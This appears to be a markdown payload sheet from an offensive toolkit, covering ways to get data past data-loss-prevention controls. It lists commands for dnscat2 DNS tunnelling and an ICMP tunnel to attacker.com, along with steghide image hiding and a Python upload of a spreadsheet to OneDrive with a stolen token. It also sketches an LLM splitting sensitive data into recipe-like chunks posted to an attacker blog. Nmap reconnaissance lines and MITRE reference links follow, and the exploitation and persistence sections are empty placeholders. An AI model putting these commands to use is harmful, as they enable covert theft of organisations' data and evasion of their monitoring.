# Payloads — data-loss-prevention-bypass

> Attack payloads for data-loss-prevention-bypass.

## DNS Tunneling

### dnscat2 server

```bash
ruby dnscat2.rb attacker.com --secret=PASSWORD
```

### dnscat2 client

```bash
dnscat2 --dns domain=attacker.com --secret=PASSWORD
```

## Image LSB Steganography

### Embed

```bash
steghide embed -cf cover.jpg -ef secret.txt -p password
```

### Extract

```bash
steghide extract -sf cover.jpg -p password
```

## ICMP Tunneling

### Server

```bash
icmp-tunnel server
```

### Client

```bash
icmp-tunnel client attacker.com
```

## Cloud Sync Exfil

```python
# Upload to corporate OneDrive
import requests
files = {'file': open('sensitive_data.xlsx', 'rb')}
requests.post('https://graph.microsoft.com/v1.0/me/drive/root:/archive.xlsx:/content',
              headers={'Authorization': 'Bearer STOLEN_TOKEN'},
              files=files)
```

## AI-Augmented Exfil (Semantic Chunking)

```python
# Use LLM to semantically chunk sensitive data
# Each chunk is benign-looking; aggregate at attacker side
chunks = llm.chunk(sensitive_data, style="recipe_instructions")
for chunk in chunks:
    post_to_attacker_blog(chunk)  # Looks like recipe blog
```


---

## Additional Payloads

### Reconnaissance

```bash
# Fingerprint target
nmap -sV target.com
whatweb target.com
```

### Exploitation

```bash
# Various exploitation payloads
# (See kali-claw for full library)
```

### Persistence

```bash
# Persistence techniques
# (Depends on specific target)
```

---

## MITRE ATT&CK Mapping + Reference Expansion (v0.2.7)

### Reference Expansion (F-DATAL-002)

- [Exfiltration tactic (T1048 family) reference](https://attack.mitre.org)
- [CAPEC exfiltration attack patterns](https://capec.mitre.org)
- [OWASP resources on data protection](https://owasp.org)
- [Purview DLP capability docs](https://learn.microsoft.com)
- [NIST SP 800-53 exfiltration controls](https://csrc.nist.gov)
